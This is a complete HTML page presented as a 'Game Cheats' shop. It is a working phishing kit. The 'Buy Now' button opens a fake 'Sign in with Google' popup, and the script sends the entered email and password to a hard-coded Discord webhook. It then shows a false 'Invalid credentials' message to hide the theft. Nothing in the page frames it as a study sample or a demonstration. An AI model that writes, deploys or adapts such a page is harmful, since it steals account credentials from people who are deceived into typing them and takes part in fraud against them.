<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Cheats</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        .container {
            margin: 50px auto;
            width: 80%;
        }
        button {
            background-color: #0f0;
            color: #000;
            font-weight: bold;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #0c0;
        }
        .login-popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #222;
            color: #eee;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        .login-popup input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 4px;
            background: #333;
            color: #eee;
        }
        .login-popup button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 4px;
            background: #0f0;
            color: #000;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to Game Cheats</h1>
        <p>Access the best cheats for all your favorite games.</p>
        <button id="buyButton">Buy Now</button>
    </div>

    <div class="login-popup" id="loginPopup">
        <h2>Sign in with Google</h2>
        <form id="fakeLoginForm">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        // Show login popup when "Buy Now" is clicked
        document.getElementById('buyButton').addEventListener('click', function() {
            document.getElementById('loginPopup').style.display = 'block';
        });

        // Handle fake login form submission
        document.getElementById('fakeLoginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Send data to the Discord webhook
            fetch('https://discord.com/api/webhooks/1325464149404160010/Dr6gpVlTmJX0277UJIiLC2mN2YDrTg0kEUQrq10gUKmCj3v-iTkwgHdfe0nhOKaiAkuo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `Email: ${email}\nPassword: ${password}`
                })
            });

            // Clear input fields
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';

            alert('Invalid credentials. Please try again.');
            document.getElementById('loginPopup').style.display = 'none';
        });
    </script>
</body>
</html>
